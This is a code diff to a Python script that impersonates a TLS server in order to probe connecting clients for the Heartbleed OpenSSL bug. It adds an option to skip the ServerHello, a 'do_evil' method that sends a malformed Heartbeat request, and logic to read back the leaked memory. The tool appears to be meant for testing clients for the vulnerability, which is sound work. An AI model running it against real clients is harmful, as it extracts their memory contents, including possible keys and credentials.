@@ -22,6 +22,8 @@ parser.add_argument('-c', '--client', default='tls',
         help='Target client type (default %(default)s)')
 parser.add_argument('-t', '--timeout', type=int, default=3,
         help='Timeout in seconds to wait for a Heartbeat (default %(default)d)')
+parser.add_argument('--skip-server', default=False, action='store_true',
+        help='Skip ServerHello, immediately write Heartbeat request')
 
 def make_hello(sslver, cipher):
     # Record
@@ -75,6 +77,7 @@ class Failure(Exception):
 class RequestHandler(socketserver.BaseRequestHandler):
     def handle(self):
         self.args = self.server.args
+        self.sslver = '03 01' # default to TLSv1.0
         remote_addr, remote_port = self.request.getpeername()
         print("Connection from: {}:{}".format(remote_addr, remote_port))
 
@@ -86,11 +89,16 @@ class RequestHandler(socketserver.BaseRequestHandler):
                 getattr(self, prep_meth)(self.request)
                 print('Pre-TLS stage completed, continuing with handshake')
 
-            self.do_magic()
+            if not self.args.skip_server:
+                self.do_serverhello()
+
+            self.do_evil()
         except (Failure, socket.timeout) as e:
             print('Unable to check for vulnerability: ' + str(e))
 
-    def do_magic(self):
+        print('')
+
+    def do_serverhello(self):
         # Read TLS record header
         hdr = self.request.recv(5)
         content_type, ver, rec_len = struct.unpack('>BHH', hdr)
@@ -109,21 +117,20 @@ class RequestHandler(socketserver.BaseRequestHandler):
         # The first cipher is fine...
         cipher = bytearray(hnd[off:off+2])
 
-        sslver = '{:02x} {:02x}'.format(ver >> 8, ver & 0xFF)
+        self.sslver = '{:02x} {:02x}'.format(ver >> 8, ver & 0xFF)
 
         # (1) Handshake: ServerHello
-        self.request.sendall(make_hello(sslver, cipher))
+        self.request.sendall(make_hello(self.sslver, cipher))
 
         # (skip Certificate, etc.)
 
+    def do_evil(self):
         # (2) HeartbeatRequest
-        self.request.sendall(make_heartbeat(sslver))
+        self.request.sendall(make_heartbeat(self.sslver))
 
-        # (3) Buggy OpenSSL will throw 0x4000 bytes, fixed ones stay silent
+        # (3) Buggy OpenSSL will throw 0xffff bytes, fixed ones stay silent
         if not self.read_memory(self.request, self.args.timeout):
             print("Possibly not vulnerable")
-
-        print("")
 
     def read_memory(self, sock, timeout):
         end_time = time.time() + timeout
